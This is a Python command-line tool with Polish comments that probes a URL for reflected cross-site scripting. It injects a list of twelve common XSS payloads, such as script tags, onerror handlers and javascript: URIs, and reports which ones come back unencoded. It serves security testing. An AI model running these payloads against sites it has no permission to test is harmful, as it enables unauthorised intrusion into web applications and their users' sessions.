#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
xssprobe.py - Tester reflected XSS (CyberKit).

Funkcja:
  Wysyla zestaw popularnych payloadow XSS w miejsce znacznika {PAYLOAD}
  w podanym URL i sprawdza, czy payload zostal odbity (reflected) w tresci
  odpowiedzi bez zakodowania. Odbicie bez kodowania sugeruje podatnosc XSS.

Wejscie:
  --url   URL z placeholderem {PAYLOAD}, np. http://site/search?q={PAYLOAD}

Wyjscie:
  Lista dzialajacych (odbitych) payloadow oraz raport JSON w reports/.

Przyklady:
    python tools/xssprobe.py --url "http://testphp.vulnweb.com/search.php?test={PAYLOAD}"
"""

import argparse
import html
from urllib.parse import quote

import requests
from common import console, print_banner, save_json
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn
from rich.table import Table

# Zestaw paylodow testowych. Kazdy zawiera unikalny znacznik, aby latwo
# bylo wykryc jego odbicie w odpowiedzi.
PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "<a href=javascript:alert(1)>x</a>",
    "<details open ontoggle=alert(1)>",
    "'\"><svg onload=alert(1)>",
]


def test_payload(url_template, payload, timeout=8, verify=True):
    """
    Wstawia payload w miejsce {PAYLOAD}, wysyla GET i analizuje odpowiedz.

    Zwraca slownik:
      {"payload", "status", "reflected", "encoded"}
    gdzie:
      reflected - payload wystapil w tresci BEZ kodowania (podatnosc),
      encoded   - payload wystapil w postaci zakodowanej HTML (zabezpieczone).
    """
    url = url_template.replace("{PAYLOAD}", quote(payload))
    headers = {"User-Agent": "CyberKit-XSSProbe/1.0"}
    try:
        resp = requests.get(url, timeout=timeout, verify=verify, headers=headers)
    except requests.exceptions.RequestException as exc:
        return {"payload": payload, "error": str(exc), "reflected": False, "encoded": False}

    body = resp.text
    reflected = payload in body
    encoded = (not reflected) and (html.escape(payload) in body)

    return {
        "payload": payload,
        "status": resp.status_code,
        "reflected": reflected,
        "encoded": encoded,
    }


def run(url_template, verify=True):
    """Testuje wszystkie payloady i zbiera wyniki."""
    if "{PAYLOAD}" not in url_template:
        console.print("[red]URL musi zawierac placeholder {PAYLOAD}.[/red]")
        console.print('Przyklad: [dim]http://site/search?q={PAYLOAD}[/dim]')
        return None

    console.print(f"[cyan]Cel:[/cyan] {url_template}")

    results = []
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("{task.completed}/{task.total}"),
        console=console,
    ) as progress:
        task = progress.add_task("[cyan]Testowanie payloadow...", total=len(PAYLOADS))
        for payload in PAYLOADS:
            results.append(test_payload(url_template, payload, verify=verify))
            progress.advance(task)

    vulnerable = [r for r in results if r.get("reflected")]
    render_table(results)

    if vulnerable:
        console.print(
            f"\n[bold red][!] Wykryto {len(vulnerable)} odbitych payloadow "
            f"- potencjalny reflected XSS![/bold red]"
        )
    else:
        console.print("\n[green]Brak odbitych payloadow (bez kodowania).[/green]")

    report = {
        "tool": "xssprobe",
        "target": url_template,
        "payloads_tested": len(PAYLOADS),
        "vulnerable_count": len(vulnerable),
        "results": results,
    }
    save_json("xssprobe", report)
    return report


def render_table(results):
    """Wyswietla wyniki testu w tabeli."""
    table = Table(title="XSSProbe - wyniki testu reflected XSS", show_lines=True)
    table.add_column("Payload", style="cyan", no_wrap=False)
    table.add_column("Status", style="dim", justify="right")
    table.add_column("Odbity", style="bold")

    for r in results:
        if r.get("error"):
            verdict = "[dim]blad[/dim]"
            status = "-"
        elif r["reflected"]:
            verdict = "[bold red]TAK (podatny)[/bold red]"
            status = str(r["status"])
        elif r["encoded"]:
            verdict = "[green]zakodowany[/green]"
            status = str(r["status"])
        else:
            verdict = "[dim]nie[/dim]"
            status = str(r["status"])
        table.add_row(r["payload"], status, verdict)
    console.print(table)


def main():
    parser = argparse.ArgumentParser(
        description="XSSProbe - tester reflected XSS."
    )
    parser.add_argument(
        "--url", "-u", required=True,
        help="URL z placeholderem {PAYLOAD}.",
    )
    parser.add_argument(
        "--insecure", "-k", action="store_true",
        help="Nie weryfikuj certyfikatu SSL.",
    )
    args = parser.parse_args()

    print_banner("XSSPROBE", "Tester reflected XSS (odbicie payloadow w odpowiedzi)")
    run(args.url, verify=not args.insecure)


if __name__ == "__main__":
    main()
